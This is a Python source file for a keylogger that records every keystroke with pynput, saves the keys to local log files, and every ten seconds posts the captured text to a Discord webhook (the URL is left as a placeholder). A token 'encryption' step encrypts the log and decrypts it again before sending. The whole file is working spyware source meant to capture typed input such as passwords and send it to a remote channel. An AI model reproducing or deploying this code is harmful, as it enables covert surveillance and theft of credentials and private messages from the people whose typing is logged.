from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from dhooks import Webhook
from threading import Timer
import logging
import os

#generate fernet key
key = Fernet.generate_key()

with open("mykey.key", "wb") as mykey:
    mykey.write(key)

def encryptor():
    f = Fernet(key)

    with open("log.txt", "rb") as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)

    with open("log.txt", "wb") as encrypted_file:
        encrypted = encrypted_file.write(encrypted)

    with open("log.txt", "rb") as encrypted_file:
        encrypted = encrypted_file.read()

    decrypted = f.decrypt(encrypted).decode("utf-8")
    
    print(decrypted)

    return decrypted

# variables to check the key presses
log_dir = ""
char_count = 0
keys = []

# constants for the periodic log sending and webhook url
WEBHOOK_URL = "token here hahaa"
TIME_INTERVAL = 10

# inputting the webhook url
log_send = Webhook(WEBHOOK_URL)

# saving the file as keylogs.txt to monitor the details
logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

    try:
        with open("eachkeylog.txt", "a") as file:
            key = "Key Pressed: " + str(key)
            file.write(key)
            file.write("\n")
    except Exception as ex:
        with open("eachkeylog.txt", "a") as file:
            key = "There was an error: " + str(ex)
            file.write(key)
            file.write("\n")

    # log the key
    # log_send.send(str(key))

def on_key_release(key):
    global keys, char_count

    if key == Key.esc:
        return False
    else:
        if key == Key.enter:
            write_to_file(keys)
            char_count = 0
            keys = []
        elif key == Key.space:
            key = " "
            write_to_file(keys)
            keys = []
            char_count = 0
        keys.append(key)
        char_count += 1

def write_to_file(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            key = str(key).replace("'", "")
            if 'key'.upper() not in key.upper():
                file.write(key)
        file.write("\n")

def report():
    if not os.path.exists("log.txt"):
        open("log.txt", "w").close()  # Create an empty log.txt file if it doesn't exist

    if os.path.getsize("log.txt") != 0:
        decrypted = encryptor()
        # with open("log.txt", "r") as file:
        #     keylogs = file.read()
        log_send.send(str(decrypted))
    
    open("log.txt", "w").close()

    Timer(TIME_INTERVAL, lambda: report()).start()

def run():
    report()
    with Listener(on_press=on_press, on_release=on_key_release) as listener:
        listener.join()

run()
